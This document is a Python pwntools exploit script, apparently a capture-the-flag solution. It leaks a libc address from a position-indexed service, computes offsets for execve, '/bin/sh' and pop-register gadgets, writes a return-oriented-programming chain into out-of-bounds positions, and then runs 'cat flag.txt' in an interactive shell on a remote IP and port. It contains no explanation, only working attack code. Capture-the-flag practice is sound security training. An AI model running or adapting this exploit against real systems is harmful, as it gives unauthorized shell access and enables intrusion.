import pwn

libc = pwn.ELF('./libc.so')

tOff = 0x812a0    # 0x812a0 | 0x77F19
execveOff =  0xe4ae0        # execve                
rdiOff = 0x12bb           # pop rdi; ret;
rsiOff = 0x12b9           # pop rsi; pop r15; ret;
binshOff = 0x1b3d88         # /bin/sh               

def getBase(proc):
    proc.recvuntil(b'Enter a position: ')
    proc.sendline(b'3')
    leak = proc.recvuntil(b'\n')
    leak = leak.replace(b'Last value [3]=', b'')
    leak = leak.replace(b'\n', b'')
    leak = leak.decode('ascii')
    leak = int(leak, 16)
    proc.sendline(b'0')
    base = leak + tOff
    return base

proc = pwn.remote('34.95.239.56', 9992)
# proc = pwn.process('./pwn')

base = getBase(proc)
print('Base: ' + hex(base))
shellString = base + binshOff
execve = base + execveOff
popRdi = base + rdiOff
popRsi = base + rsiOff

payload = f'9\n{int(popRdi)}\n10\n{int(shellString)}\n11\n{int(popRsi)}\n12\n{int(0)}\n13\n{int(0)}\n14\n{int(execve)}\n-1\n'

print(payload)
proc.recvuntil(b'Enter a position: ')
proc.send(payload)
proc.send(b'cat flag.txt\n')
proc.interactive()